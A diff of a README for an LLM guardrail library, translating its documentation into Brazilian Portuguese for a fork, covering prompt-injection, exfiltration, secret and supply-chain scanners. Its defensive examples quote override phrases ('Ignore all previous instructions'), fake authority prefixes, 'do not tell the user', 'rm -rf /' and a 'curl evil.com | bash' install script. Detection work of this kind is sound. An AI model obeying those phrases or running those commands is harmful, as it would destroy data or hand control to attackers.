@@ -6,9 +6,11 @@
 [![Benchmark](https://img.shields.io/badge/benchmark-600%20cases%20100%25-brightgreen.svg)](#benchmark)
 [![Live Demo](https://img.shields.io/badge/demo-try%20it%20live-blue.svg)](https://maxwellcalkin.github.io/sentinel-ai/)
 
-**Real-time safety guardrails for LLM applications.** [Try the live demo](https://maxwellcalkin.github.io/sentinel-ai/)
+> Este repositório é um fork traduzido de [MaxwellCalkin/sentinel-ai](https://github.com/MaxwellCalkin/sentinel-ai), com modificações (tradução da documentação para pt-BR). Licença original Apache 2.0 mantida — veja [LICENSE](LICENSE).
 
-Sentinel AI is a lightweight, zero-dependency safety layer that protects your LLM applications from prompt injection, PII leaks, harmful content, hallucinations, and toxic outputs — with sub-millisecond latency.
+**Guardrails de segurança em tempo real para aplicações LLM.** [Experimente a demo ao vivo](https://maxwellcalkin.github.io/sentinel-ai/)
+
+Sentinel AI é uma camada de segurança leve, sem dependências pesadas, que protege suas aplicações LLM contra prompt injection, vazamentos de PII, conteúdo nocivo, alucinações e saídas tóxicas — com latência sub-milissegundo.
 
 ```python
 from sentinel import SentinelGuard
@@ -21,16 +23,16 @@ print(result.risk)      # RiskLevel.CRITICAL
 print(result.findings)  # [Finding(category='prompt_injection', ...)]
 ```
 
-## Why Sentinel AI?
+## Por que o Sentinel AI?
 
-- **Fast**: ~0.05ms average scan latency. No GPU required. No API calls.
-- **Comprehensive**: 11 built-in scanners covering the OWASP LLM Top 10.
-- **Zero heavy dependencies**: Core library needs only `regex`. No PyTorch, no transformers.
-- **Drop-in integrations**: Works with Claude, OpenAI, LangChain, LlamaIndex, and any LLM.
-- **Production-ready**: Auth, rate limiting, webhooks, OpenTelemetry, streaming protection.
-- **Complementary to model-based security**: Use as a deterministic first-pass filter alongside AI-powered tools like Claude Code Security. Catches known attack patterns instantly so the model can focus on harder security questions.
+- **Rápido**: ~0,05ms de latência média de verificação. Não requer GPU. Não faz chamadas de API.
+- **Abrangente**: 11 scanners nativos cobrindo o OWASP LLM Top 10.
+- **Sem dependências pesadas**: a biblioteca core precisa apenas de `regex`. Sem PyTorch, sem transformers.
+- **Integrações plug-and-play**: funciona com Claude, OpenAI, LangChain, LlamaIndex e qualquer LLM.
+- **Pronto para produção**: autenticação, rate limiting, webhooks, OpenTelemetry, proteção de streaming.
+- **Complementar à segurança baseada em modelo**: use como um filtro determinístico de primeira passagem ao lado de ferramentas com IA como o Claude Code Security. Detecta padrões de ataque conhecidos instantaneamente, deixando o modelo focar nas questões de segurança mais difíceis.
 
-## Architecture
+## Arquitetura
 
 ```
 ┌──────────────────────────────────────────────────────────┐
@@ -72,9 +74,9 @@ print(result.findings)  # [Finding(category='prompt_injection', ...)]
 └──────────────────────────────────────────────────────────┘
 ```
 
-## Installation
+## Instalação
 
-### Claude Code Plugin (recommended)
+### Plugin do Claude Code (recomendado)
 
 ```bash
 # Add the Sentinel AI marketplace
@@ -84,21 +86,21 @@ print(result.findings)  # [Finding(category='prompt_injection', ...)]
 /plugin install sentinel-ai@sentinel-ai-safety
 ```
 
-Then use `/sentinel-ai:scan`, `/sentinel-ai:check-pii`, and `/sentinel-ai:check-safety` commands directly in Claude Code. The plugin also includes an auto-invoked safety-scanning skill and 4 MCP tools.
+Depois, use os comandos `/sentinel-ai:scan`, `/sentinel-ai:check-pii` e `/sentinel-ai:check-safety` diretamente no Claude Code. O plugin também inclui uma skill de verificação de segurança auto-invocada e 4 ferramentas MCP.
 
-### Python Package
+### Pacote Python
 
 ```bash
 pip install sentinel-guardrails
 ```
 
-Or install directly from GitHub:
+Ou instale diretamente do GitHub:
 
 ```bash
 pip install git+https://github.com/MaxwellCalkin/sentinel-ai.git
 ```
 
-With optional integrations:
+Com integrações opcionais:
 
 ```bash
 pip install "sentinel-guardrails[api]"         # FastAPI server
@@ -120,9 +122,9 @@ const result = guard.scan('Ignore all previous instructions');
 console.log(result.blocked); // true
 ```
 
-Standalone scanning in Node.js, Deno, Bun, and browsers — zero runtime dependencies. The JS SDK includes `CodeScanner` (OWASP Top 10), `DependencyScanner` (supply chain attacks), `PromptHardener`, `CanaryToken`, and all core scanners. See [`sdk-js/README.md`](sdk-js/README.md) for details.
+Verificação standalone em Node.js, Deno, Bun e navegadores — zero dependências em runtime. O SDK JS inclui `CodeScanner` (OWASP Top 10), `DependencyScanner` (ataques de supply chain), `PromptHardener`, `CanaryToken` e todos os scanners core. Veja [`sdk-js/README.md`](sdk-js/README.md) para detalhes.
 
-### Code Vulnerability & Supply Chain Scanning
+### Verificação de Vulnerabilidades de Código e Cadeia de Suprimentos (Supply Chain)
 
 ```typescript
 import { CodeScanner, DependencyScanner } from '@sentinel-ai/sdk';
@@ -138,9 +140,9 @@ const depFindings = deps.scan('{"dependencies":{"crossenv":"^1.0.0"}}', 'package
 // [{category: 'malicious_package', risk: 'CRITICAL', ...}]
 ```
 
-Use as a [Claude Code PostToolUse hook](examples/claude_code_hook.ts) to scan code as it's written — blocks Write/Edit on high/critical vulnerabilities.
+Use como um [hook PostToolUse do Claude Code](examples/claude_code_hook.ts) para verificar o código conforme é escrito — bloqueia Write/Edit em vulnerabilidades high/critical.
 
-### Adversarial Eval Suite
+### Suíte de Avaliação Adversarial
 
 ```typescript
 import { EvalRunner } from '@sentinel-ai/sdk';
@@ -153,9 +155,9 @@ console.log(`TP: ${report.truePositives} TN: ${report.trueNegatives} FP: ${repor
 console.log(runner.formatReport(report));
 ```
 
-Test your safety pipeline against injection, obfuscation, PII, harmful content, toxicity, and benign false-positive cases. Also available in the [live demo](https://maxwellcalkin.github.io/sentinel-ai/) under the "Eval Suite" tab.
+Teste seu pipeline de segurança contra casos de injection, ofuscação, PII, conteúdo nocivo, toxicidade e falsos positivos benignos. Também disponível na [demo ao vivo](https://maxwellcalkin.github.io/sentinel-ai/) na aba "Eval Suite".
 
-### Production Features
+### Recursos de Produção
 
 ```python
 from sentinel import SentinelGuard, ScanCache, ScanMetrics
@@ -177,9 +179,9 @@ results = guard.scan_batch(["text1", "text2", "text3"])
 results = await guard.scan_batch_async(["text1", "text2", "text3"])  # concurrent
 ```
 
-## Quick Start
+## Início Rápido
 
-### Basic Scanning
+### Verificação Básica
 
 ```python
 from sentinel import SentinelGuard
@@ -200,7 +202,7 @@ print(result.redacted_text)
 # "My email is [EMAIL] and SSN is [SSN]"
 ```
 
-### Claude Agent SDK Integration
+### Integração com o Claude Agent SDK
 
 ```python
 from claude_agent_sdk import ClaudeAgentOptions, ClaudeSDKClient, HookMatcher
@@ -221,7 +223,7 @@ async with ClaudeSDKClient(options=options) as client:
         print(msg)  # Dangerous tool calls are automatically blocked
 ```
 
-### Claude SDK Integration
+### Integração com o Claude SDK
 
 ```python
 from anthropic import Anthropic
@@ -239,7 +241,7 @@ if not result["blocked"]:
     print(result["response"].content[0].text)
 ```
 
-**Streaming with real-time safety scanning:**
+**Streaming com verificação de segurança em tempo real:**
 
 ```python
 from sentinel.middleware.anthropic_wrapper import guarded_stream
@@ -256,7 +258,7 @@ for event in guarded_stream(
     print(event["text"], end="", flush=True)
 ```
 
-### OpenAI SDK Integration
+### Integração com o OpenAI SDK
 
 ```python
 from openai import OpenAI
@@ -270,7 +272,7 @@ result = guarded_chat(
 )
 ```
 
-### LangChain Integration
+### Integração com o LangChain
 
 ```python
 from langchain_openai import ChatOpenAI
@@ -286,7 +288,7 @@ if handler.blocked:
     print(handler.findings)
 ```
 
-### LlamaIndex Integration
+### Integração com o LlamaIndex
 
 ```python
 from sentinel.middleware.llamaindex_callback import SentinelEventHandler
@@ -300,7 +302,7 @@ result = handler.scan_query("What does the document say?")
 result = handler.scan_response(response_text)
 ```
 
-### Streaming Protection
+### Proteção de Streaming
 
 ```python
 from sentinel import StreamingGuard
@@ -314,7 +316,7 @@ async for token in llm_stream:
     yield token
 ```
 
-### REST API Server
+### Servidor REST API
 
 ```bash
 sentinel serve --port 8000
@@ -326,7 +328,7 @@ curl -X POST http://localhost:8000/scan \
   -d '{"text": "Hello, world!"}'
 ```
 
-### Quick Setup
+### Configuração Rápida
 
 ```bash
 pip install sentinel-guardrails
@@ -358,9 +360,9 @@ sentinel compliance --file prompts.txt --format json  # Assess prompts against r
 sentinel init     # Set up Claude Code hooks, MCP config, pre-commit hook, and policy
 ```
 
-### Project-Wide Security Scan
+### Verificação de Segurança em Todo o Projeto
 
-Run every scanner in one command — get a unified security score (0-100) across your entire project:
+Execute todos os scanners em um único comando — obtenha um score de segurança unificado (0-100) em todo o seu projeto:
 
 ```bash
 sentinel project-scan              # Scan current directory
@@ -368,17 +370,17 @@ sentinel project-scan --dir /path  # Scan specific project
 sentinel project-scan --format json  # JSON output for CI/CD
 ```
 
-Runs 6 security checks in one pass:
-1. **CLAUDE.md injection vectors** — hidden instructions, authority impersonation
-2. **Supply chain attacks** — typosquatting, malicious packages, install scripts
-3. **Hardcoded secrets** — API keys, tokens, private keys, connection strings
-4. **Code vulnerabilities** — SQL injection, XSS, command injection (OWASP Top 10)
-5. **Security configuration** — hooks, permissions, MCP settings
-6. **MCP tool schemas** — prompt injection in tool definitions
+Executa 6 verificações de segurança em uma única passagem:
+1. **Vetores de injeção no CLAUDE.md** — instruções ocultas, personificação de autoridade
+2. **Ataques de supply chain** — typosquatting, pacotes maliciosos, scripts de instalação
+3. **Segredos hardcoded** — API keys, tokens, chaves privadas, connection strings
+4. **Vulnerabilidades de código** — SQL injection, XSS, command injection (OWASP Top 10)
+5. **Configuração de segurança** — hooks, permissões, configurações MCP
+6. **Schemas de ferramentas MCP** — prompt injection em definições de ferramentas
 
-### Claude Code Hooks
+### Hooks do Claude Code
 
-Automatically scan every tool call in Claude Code for safety issues. Add to `.claude/settings.json`:
+Verifica automaticamente cada chamada de ferramenta no Claude Code em busca de problemas de segurança. Adicione ao `.claude/settings.json`:
 
 ```json
 {
@@ -393,13 +395,13 @@ Automatically scan every tool call in Claude Code for safety issues. Add to `.cl
 }
 ```
 
-This blocks dangerous shell commands (`rm -rf /`, credential access), data exfiltration attempts, and prompt injection in tool arguments — before they execute.
+Isso bloqueia comandos de shell perigosos (`rm -rf /`, acesso a credenciais), tentativas de exfiltração de dados e prompt injection em argumentos de ferramentas — antes de serem executados.
 
-### MCP Server (Model Context Protocol)
+### Servidor MCP (Model Context Protocol)
 
-Sentinel AI runs as an MCP server, making safety scanning available to Claude Desktop, Claude Code, and any MCP-compatible client.
+Sentinel AI roda como um servidor MCP, disponibilizando a verificação de segurança para o Claude Desktop, Claude Code e qualquer cliente compatível com MCP.
 
-Add to your `claude_desktop_config.json`:
+Adicione ao seu `claude_desktop_config.json`:
 
 ```json
 {
@@ -412,11 +414,11 @@ Add to your `claude_desktop_config.json`:
 }
 ```
 
-Available MCP tools (14): `scan_text`, `scan_tool_call`, `check_pii`, `get_risk_report`, `scan_conversation`, `test_robustness`, `scan_code`, `scan_secrets`, `check_canary`, `harden_prompt`, `generate_rsp_report`, `compliance_check`, `threat_lookup`, `guard_tool_call`.
+Ferramentas MCP disponíveis (14): `scan_text`, `scan_tool_call`, `check_pii`, `get_risk_report`, `scan_conversation`, `test_robustness`, `scan_code`, `scan_secrets`, `check_canary`, `harden_prompt`, `generate_rsp_report`, `compliance_check`, `threat_lookup`, `guard_tool_call`.
 
-### CLAUDE.md Security Scanner
+### Verificador de Segurança do CLAUDE.md
 
-Scan project instruction files (CLAUDE.md, .cursorrules, copilot-instructions.md) for hidden injection vectors:
+Verifica arquivos de instrução do projeto (CLAUDE.md, .cursorrules, copilot-instructions.md) em busca de vetores de injeção ocultos:
 
 ```bash
 sentinel claudemd-scan              # Auto-detect and scan all instruction files
@@ -424,11 +426,11 @@ sentinel claudemd-scan --file CLAUDE.md  # Scan specific file
 sentinel claudemd-scan --format json     # JSON output for CI
 ```
 
-Detects: hidden HTML comment injections, authority impersonation, API URL hijacking, zero-width character smuggling, base64 payloads, Unicode homoglyphs, dangerous permission grants, and safety-disabling instructions. Returns exit code 1 if critical issues are found.
+Detecta: injeções ocultas em comentários HTML, personificação de autoridade, sequestro de URL de API, contrabando de caracteres zero-width, payloads em base64, homóglifos Unicode, concessões de permissão perigosas e instruções que desativam a segurança. Retorna exit code 1 se problemas críticos forem encontrados.
 
-### FastAPI Middleware
+### Middleware do FastAPI
 
-Drop-in safety scanning for any FastAPI application:
+Verificação de segurança plug-and-play para qualquer aplicação FastAPI:
 
 ```python
 from fastapi import FastAPI
@@ -444,9 +446,9 @@ async def chat(request: dict):
     return {"response": "Hello!"}
 ```
 
-### LLM API Firewall
+### Firewall de API LLM
 
-Transparent reverse proxy that sits between your app and any LLM API, scanning all requests and responses:
+Proxy reverso transparente que fica entre sua aplicação e qualquer API LLM, verificando todas as requisições e respostas:
 
 ```bash
 # Start the firewall (proxies to Anthropic by default)
@@ -459,11 +461,11 @@ export ANTHROPIC_BASE_URL=http://localhost:8330
 sentinel proxy --target https://api.openai.com --port 8330
 ```
 
-The firewall scans input messages for injection/harmful content, scans output for PII/dangerous content, blocks dangerous tool calls, auto-redacts PII in responses, and adds `X-Sentinel-*` headers with scan metadata. Stats available at `/_sentinel/stats`.
+O firewall verifica mensagens de entrada em busca de injection/conteúdo nocivo, verifica a saída em busca de PII/conteúdo perigoso, bloqueia chamadas de ferramentas perigosas, redige PII automaticamente nas respostas e adiciona headers `X-Sentinel-*` com metadados da verificação. Estatísticas disponíveis em `/_sentinel/stats`.
 
-### Git Pre-Commit Hook
+### Hook de Pre-Commit do Git
 
-Automatically scan staged code for OWASP vulnerabilities before each commit:
+Verifica automaticamente o código staged em busca de vulnerabilidades OWASP antes de cada commit:
 
 ```bash
 sentinel init    # Installs pre-commit hook + Claude Code hooks + MCP server
@@ -473,11 +475,11 @@ sentinel pre-commit              # Scan staged files (use in .git/hooks/pre-comm
 sentinel pre-commit --block-on critical  # Only block critical findings
 ```
 
-The pre-commit hook scans `.py`, `.js`, `.ts`, `.jsx`, `.tsx`, `.rb`, `.php`, `.java`, `.go`, `.rs` files for SQL injection, command injection, XSS, hardcoded secrets, and other OWASP vulnerabilities.
+O hook de pre-commit verifica arquivos `.py`, `.js`, `.ts`, `.jsx`, `.tsx`, `.rb`, `.php`, `.java`, `.go`, `.rs` em busca de SQL injection, command injection, XSS, segredos hardcoded e outras vulnerabilidades OWASP.
 
-### Security Audit
+### Auditoria de Segurança
 
-Audit your project's Claude Code security configuration and get a score out of 100:
+Audite a configuração de segurança do Claude Code do seu projeto e obtenha um score de até 100:
 
 ```bash
 sentinel audit                  # Audit current directory
@@ -485,11 +487,11 @@ sentinel audit --format json    # JSON output for CI/CD integration
 sentinel audit --dir /path/to/project
 ```
 
-Checks 6 areas: Claude Code hooks, permissions allowlist, security policy, environment files, git pre-commit hooks, and MCP server configuration. Returns exit code 1 if critical issues are found.
+Verifica 6 áreas: hooks do Claude Code, allowlist de permissões, política de segurança, arquivos de ambiente, git pre-commit hooks e configuração do servidor MCP. Retorna exit code 1 se problemas críticos forem encontrados.
 
-### MCP Tool Schema Validator
+### Validador de Schema de Ferramentas MCP
 
-Validate that MCP tool definitions don't contain prompt injection, authority impersonation, or data exfiltration instructions hidden in tool descriptions:
+Valida que definições de ferramentas MCP não contenham prompt injection, personificação de autoridade ou instruções de exfiltração de dados ocultas nas descrições das ferramentas:
 
 ```bash
 sentinel mcp-validate --file tools.json
@@ -497,14 +499,14 @@ sentinel mcp-validate --stdin < tools.json
 sentinel mcp-validate --format json
 ```
 
-Detects:
-- **Prompt injection** in tool/parameter descriptions ("ignore all previous instructions")
-- **Authority impersonation** ("SYSTEM:", "ADMIN:", "Anthropic says:")
-- **Data exfiltration** instructions (curl to external URLs, send credentials)
-- **Concealment** instructions ("do not tell the user")
-- **Suspicious defaults** (URLs, shell commands as parameter defaults)
-- **Hidden content** (HTML comments, zero-width characters)
-- **Excessive descriptions** (abnormally long, likely injected)
+Detecta:
+- **Prompt injection** em descrições de ferramentas/parâmetros ("ignore all previous instructions")
+- **Personificação de autoridade** ("SYSTEM:", "ADMIN:", "Anthropic says:")
+- **Instruções de exfiltração de dados** (curl para URLs externas, envio de credenciais)
+- **Instruções de ocultação** ("do not tell the user")
+- **Valores padrão suspeitos** (URLs, comandos de shell como valores padrão de parâmetros)
+- **Conteúdo oculto** (comentários HTML, caracteres zero-width)
+- **Descrições excessivas** (anormalmente longas, provavelmente injetadas)
 
 ```python
 from sentinel.mcp_schema_validator import validate_mcp_tools
@@ -514,9 +516,9 @@ report = validate_mcp_tools(tools)
 print(report.safe)  # False
 ```
 
-### Dependency Scanner
+### Verificador de Dependências
 
-Scan dependency files for supply chain attacks — typosquatting, known malicious packages, suspicious install scripts, and more:
+Verifica arquivos de dependências em busca de ataques de supply chain — typosquatting, pacotes maliciosos conhecidos, scripts de instalação suspeitos e mais:
 
 ```bash
 sentinel dep-scan                   # Auto-detect dependency files in current project
@@ -524,18 +526,18 @@ sentinel dep-scan --file package.json  # Scan specific file
 sentinel dep-scan --format json     # JSON output for CI/CD
 ```
 
-Detects:
-- **Typosquatting** — `reqests` instead of `requests`, `loadash` instead of `lodash`
-- **Known malicious packages** — 50+ packages removed from PyPI/npm for malware
-- **Suspicious URLs** — dependencies from paste sites, raw IPs, untrusted TLDs
-- **Dangerous install scripts** — `postinstall: "curl evil.com | bash"` in package.json
-- **Version pinning issues** — unpinned, wildcard, or loosely bounded versions
+Detecta:
+- **Typosquatting** — `reqests` no lugar de `requests`, `loadash` no lugar de `lodash`
+- **Pacotes maliciosos conhecidos** — mais de 50 pacotes removidos do PyPI/npm por malware
+- **URLs suspeitas** — dependências vindas de paste sites, IPs crus, TLDs não confiáveis
+- **Scripts de instalação perigosos** — `postinstall: "curl evil.com | bash"` no package.json
+- **Problemas de fixação de versão** — versões sem pin, com wildcard ou frouxamente delimitadas
 
-Supports: `requirements.txt`, `package.json`, `pyproject.toml`, `Pipfile`
+Suporta: `requirements.txt`, `package.json`, `pyproject.toml`, `Pipfile`
 
-### Secrets Scanner
+### Verificador de Segredos
 
-Scan source code for hardcoded credentials, API keys, tokens, and private keys:
+Verifica o código-fonte em busca de credenciais hardcoded, API keys, tokens e chaves privadas:
 
 ```bash
 sentinel secrets-scan                  # Scan current project
@@ -543,19 +545,19 @@ sentinel secrets-scan --file config.py # Scan specific file
 sentinel secrets-scan --format json    # JSON output for CI/CD
 ```
 
-Detects 40+ secret patterns:
-- **Cloud providers** — AWS access keys, Azure storage keys, Google API keys, Firebase
-- **Code platforms** — GitHub tokens (ghp_, gho_, ghs_, github_pat_), npm, PyPI tokens
+Detecta mais de 40 padrões de segredos:
+- **Provedores cloud** — AWS access keys, Azure storage keys, Google API keys, Firebase
+- **Plataformas de código** — GitHub tokens (ghp_, gho_, ghs_, github_pat_), npm, PyPI tokens
 - **Payment/SaaS** — Stripe, Twilio, SendGrid, Slack, Mailgun, Heroku API keys
-- **AI providers** — OpenAI, Anthropic API keys
-- **Private keys** — RSA, EC, PGP, OpenSSH private keys
-- **Generic secrets** — passwords, API keys, bearer tokens, connection strings
-- **Entropy analysis** — reduces false positives by filtering low-entropy values
-- **Smart filtering** — skips comments, placeholders, env var references, lock files
+- **Provedores de IA** — OpenAI, Anthropic API keys
+- **Chaves privadas** — RSA, EC, PGP, OpenSSH private keys
+- **Segredos genéricos** — senhas, API keys, bearer tokens, connection strings
+- **Análise de entropia** — reduz falsos positivos filtrando valores de baixa entropia
+- **Filtragem inteligente** — ignora comentários, placeholders, referências a env vars, lock files
 
-### MCP Safety Proxy
+### Proxy de Segurança MCP
 
-Proxy any MCP server through Sentinel's safety layer. Scans all tool arguments before forwarding and auto-redacts PII in responses:
+Faz proxy de qualquer servidor MCP através da camada de segurança do Sentinel. Verifica todos os argumentos de ferramentas antes de encaminhar e redige PII automaticamente nas respostas:
 
 ```json
 {
@@ -574,26 +576,26 @@ sentinel mcp-proxy -- npx @modelcontextprotocol/server-filesystem /tmp
 sentinel mcp-proxy --block-on critical -- python my_mcp_server.py
 ```
 
-The proxy transparently intercepts tool calls, blocks dangerous operations (shell injection, data exfiltration), and redacts PII in tool responses — without modifying the upstream MCP server.
+O proxy intercepta as chamadas de ferramentas de forma transparente, bloqueia operações perigosas (shell injection, exfiltração de dados) e redige PII nas respostas das ferramentas — sem modificar o servidor MCP upstream.
 
 ## Scanners
 
-| Scanner | Detects | Risk Levels |
+| Scanner | Detecta | Níveis de Risco |
 |---------|---------|-------------|
-| **Prompt Injection** | Instruction overrides, role injection, delimiter attacks, jailbreaks, prompt extraction, **multilingual (12 languages)**, cross-lingual injection, **Claude Code attack vectors** (HTML comment injection, authority impersonation, base URL exfil, config injection) | LOW — CRITICAL |
-| **PII Detection** | Emails, SSNs, credit cards (Luhn-validated), phone numbers, API keys, tokens | LOW — CRITICAL |
-| **Harmful Content** | Weapons/drug synthesis, self-harm, hacking, fraud instructions | HIGH — CRITICAL |
-| **Hallucination** | Fabricated citations, false confidence markers, self-contradictions | LOW — MEDIUM |
-| **Toxicity** | Threats, severe insults, profanity, aggressive tone | LOW — CRITICAL |
-| **Blocked Terms** | Custom enterprise-specific blocked terms and phrases | Configurable |
-| **Tool Use** | Dangerous shell commands, data exfiltration, credential access, privilege escalation | MEDIUM — CRITICAL |
-| **Structured Output** | XSS, SQL injection, template injection, path traversal in JSON values; schema validation | LOW — CRITICAL |
-| **Code Scanner** | SQL injection, command injection, XSS, path traversal, insecure deserialization, hardcoded secrets, weak crypto, SSRF in generated code | MEDIUM — CRITICAL |
-| **Obfuscation** | Base64-encoded payloads, hex-encoded commands, ROT13-encoded instructions, unicode escape sequences, leetspeak variants of dangerous terms | MEDIUM — HIGH |
+| **Prompt Injection** | Sobrescrita de instruções, injeção de papel (role injection), ataques via delimitadores, jailbreaks, extração de prompt, **multilíngue (12 idiomas)**, injeção cross-lingual, **vetores de ataque do Claude Code** (injeção via comentário HTML, personificação de autoridade, exfiltração de base URL, injeção de config) | LOW — CRITICAL |
+| **PII Detection** | E-mails, SSNs, cartões de crédito (validados via Luhn), telefones, API keys, tokens | LOW — CRITICAL |
+| **Harmful Content** | Síntese de armas/drogas, automutilação, hacking, instruções de fraude | HIGH — CRITICAL |
+| **Hallucination** | Citações fabricadas, marcadores de falsa confiança, autocontradições | LOW — MEDIUM |
+| **Toxicity** | Ameaças, insultos graves, palavrões, tom agressivo | LOW — CRITICAL |
+| **Blocked Terms** | Termos e frases bloqueados customizados, específicos da empresa | Configurável |
+| **Tool Use** | Comandos de shell perigosos, exfiltração de dados, acesso a credenciais, escalação de privilégio | MEDIUM — CRITICAL |
+| **Structured Output** | XSS, SQL injection, injeção de template, path traversal em valores JSON; validação de schema | LOW — CRITICAL |
+| **Code Scanner** | SQL injection, command injection, XSS, path traversal, deserialização insegura, segredos hardcoded, criptografia fraca, SSRF em código gerado | MEDIUM — CRITICAL |
+| **Obfuscation** | Payloads codificados em base64, comandos codificados em hex, instruções codificadas em ROT13, sequências de escape unicode, variantes leetspeak de termos perigosos | MEDIUM — HIGH |
 
-### Obfuscation Detection
+### Detecção de Ofuscação
 
-Catches attack payloads hidden through encoding or obfuscation — the kind of thing keyword filters miss:
+Detecta payloads de ataque escondidos por meio de encoding ou ofuscação — o tipo de coisa que filtros de palavras-chave deixam passar:
 
 ```python
 import base64
@@ -613,9 +615,9 @@ print(findings[0].description)
 # "Leetspeak obfuscation detected: 'ignore instructions' hidden in text"
 ```
 
-### Multilingual Prompt Injection Detection
+### Detecção de Injeção de Prompt Multilíngue
 
-Detects prompt injection in 12 languages plus cross-lingual attacks (English injection keywords embedded in non-Latin text):
+Detecta prompt injection em 12 idiomas, além de ataques cross-lingual (palavras-chave de injeção em inglês embutidas em texto não latino):
 
 ```python
 from sentinel import SentinelGuard
@@ -639,9 +641,9 @@ result = guard.scan("日本語を勉強しています")  # "I'm studying Japane
 assert result.safe
 ```
 
-Supported languages: Chinese (Simplified + Traditional), Japanese, Korean, Russian, Arabic, Spanish, French, German, Portuguese, Hindi — plus cross-lingual injection detection for mixed-script attacks.
+Idiomas suportados: chinês (simplificado e tradicional), japonês, coreano, russo, árabe, espanhol, francês, alemão, português, hindi — além de detecção de injeção cross-lingual para ataques com scripts mistos.
 
-### Agentic Tool-Use Safety
+### Segurança de Uso de Ferramentas em Agentes
 
 ```python
 from sentinel.scanners.tool_use import ToolUseScanner
@@ -659,9 +661,9 @@ findings = scanner.scan_tool_call(
 # Finds: sensitive file access + shell execution
 ```
 
-### Structured Output Validation
+### Validação de Saída Estruturada
 
-Scan LLM-generated JSON for injection attacks hidden in field values, plus schema validation:
+Verifica JSON gerado por LLM em busca de ataques de injeção escondidos em valores de campo, além de validação de schema:
 
 ```python
 from sentinel.scanners.structured_output import StructuredOutputScanner
@@ -678,9 +680,9 @@ findings = scanner.scan('{"name": "<script>alert(1)</script>"}')
 findings = scanner.scan('{"name": "Alice", "age": 200}')
 ```
 
-### Code Vulnerability Scanner
+### Verificador de Vulnerabilidades de Código
 
-Scan LLM-generated code for OWASP Top 10 vulnerabilities before it's committed:
+Verifica código gerado por LLM em busca de vulnerabilidades do OWASP Top 10 antes de ser commitado:
 
 ```python
 from sentinel.scanners.code_scanner import CodeScanner
@@ -709,11 +711,11 @@ sentinel code-scan --file app.py
 cat generated.py | sentinel code-scan --stdin
 ```
 
-Detects: SQL injection, command injection, XSS, path traversal, insecure deserialization (pickle/eval/yaml), hardcoded secrets (AWS keys, passwords, API tokens), weak cryptography (MD5/SHA1/DES/ECB), and SSRF.
+Detecta: SQL injection, command injection, XSS, path traversal, deserialização insegura (pickle/eval/yaml), segredos hardcoded (AWS keys, senhas, API tokens), criptografia fraca (MD5/SHA1/DES/ECB) e SSRF.
 
-### RSP-Aligned Risk Reports
+### Relatórios de Risco Alinhados ao RSP
 
-Generate safety risk reports aligned with Anthropic's [Responsible Scaling Policy (RSP) v3.0](https://www.anthropic.com/rsp-updates):
+Gera relatórios de risco de segurança alinhados com a [Responsible Scaling Policy (RSP) v3.0](https://www.anthropic.com/rsp-updates) da Anthropic:
 
 ```python
 from sentinel.rsp_report import RiskReportGenerator
@@ -729,11 +731,11 @@ print(report.to_markdown())   # Structured RSP-format report
 print(report.to_dict())       # JSON for programmatic use
 ```
 
-Reports include threat domain assessments, risk distribution, active mitigations, and actionable recommendations -- mapping directly to RSP risk categories.
+Os relatórios incluem avaliações de domínio de ameaça, distribuição de risco, mitigações ativas e recomendações acionáveis -- mapeando diretamente para as categorias de risco do RSP.
 
-### Multi-Turn Conversation Safety
+### Segurança de Conversas Multi-Turno
 
-Track safety across entire conversations -- detects gradual jailbreak escalation, topic persistence attacks, sandwich attacks, and re-attempts after blocks that single-message scanning misses:
+Acompanha a segurança ao longo de conversas inteiras -- detecta escalação gradual de jailbreak, ataques de persistência de tópico, sandwich attacks e novas tentativas após bloqueios que a verificação de mensagem única deixa passar:
 
 ```python
 from sentinel.conversation import ConversationGuard
@@ -752,9 +754,9 @@ summary = conv.summarize()
 print(summary.flags)  # ['Escalation detected 1 time(s)', '1 turn(s) blocked']
 ```
 
-### Canary Tokens for Prompt Leak Detection
+### Canary Tokens para Detecção de Vazamento de Prompt
 
-Plant invisible markers in system prompts. If they appear in model output, your prompt was leaked:
+Planta marcadores invisíveis em system prompts. Se eles aparecerem na saída do modelo, seu prompt foi vazado:
 
 ```python
 from sentinel.canary import CanarySystem
@@ -771,11 +773,11 @@ if leaks:
     print("ALERT: System prompt leaked!", leaks[0].metadata["canary_name"])
 ```
 
-Supports two styles: `comment` (HTML comments) and `zero-width` (truly invisible Unicode encoding).
+Suporta dois estilos: `comment` (comentários HTML) e `zero-width` (encoding Unicode verdadeiramente invisível).
 
-### Prompt Hardening
+### Fortalecimento de Prompt (Prompt Hardening)
 
-Make system prompts injection-resistant with multiple defense layers:
+Torna system prompts resistentes a injection com múltiplas camadas de defesa:
 
 ```python
 from sentinel.harden import harden_prompt
@@ -789,11 +791,11 @@ safe_prompt = harden_prompt(
 # markers, and sandwich defense (core instruction repeated at end)
 ```
 
-Also available: `fence_user_input()` to wrap untrusted input in delimiters, and `xml_tag_sections()` to structure prompts with clear boundaries.
+Também disponível: `fence_user_input()` para envolver entrada não confiável em delimitadores, e `xml_tag_sections()` para estruturar prompts com limites claros.
 
-### Adversarial Robustness Testing
+### Teste de Robustez Adversarial
 
-Red-team your safety scanners with automated evasion variant generation. Tests 10+ techniques including homoglyphs, zero-width characters, leetspeak, payload splitting, and synonym substitution:
+Faça red-team dos seus scanners de segurança com geração automatizada de variantes de evasão. Testa mais de 10 técnicas, incluindo homóglifos, caracteres zero-width, leetspeak, divisão de payload e substituição de sinônimos:
 
 ```python
 from sentinel.adversarial import AdversarialTester
@@ -815,9 +817,9 @@ print(batch.summary())
 print(f"Weakest areas: {batch.weak_techniques}")
 ```
 
-### Regulatory Compliance Mapping
+### Mapeamento de Conformidade Regulatória
 
-Map scan results to EU AI Act, NIST AI RMF, and ISO/IEC 42001 controls. Get automated compliance status and remediation recommendations:
+Mapeia os resultados da verificação para controles do EU AI Act, NIST AI RMF e ISO/IEC 42001. Obtenha status de conformidade automatizado e recomendações de remediação:
 
 ```python
 from sentinel.compliance import ComplianceMapper, Framework
@@ -835,11 +837,11 @@ print(data["frameworks"][0]["risk_classification"])  # "Minimal Risk"
 print(data["frameworks"][0]["status"])               # "compliant"
 ```
 
-Assesses 21 controls across three frameworks with automated risk classification, per-control status, and actionable remediation guidance.
+Avalia 21 controles em três frameworks, com classificação de risco automatizada, status por controle e orientação de remediação acionável.
 
-### Agent Safety Monitor
+### Monitor de Segurança de Agentes
 
-Track tool-use patterns across agentic AI sessions and detect anomalous behavior in real-time:
+Acompanha padrões de uso de ferramentas em sessões de IA agêntica e detecta comportamento anômalo em tempo real:
 
 ```python
 from sentinel.agent_monitor import AgentMonitor
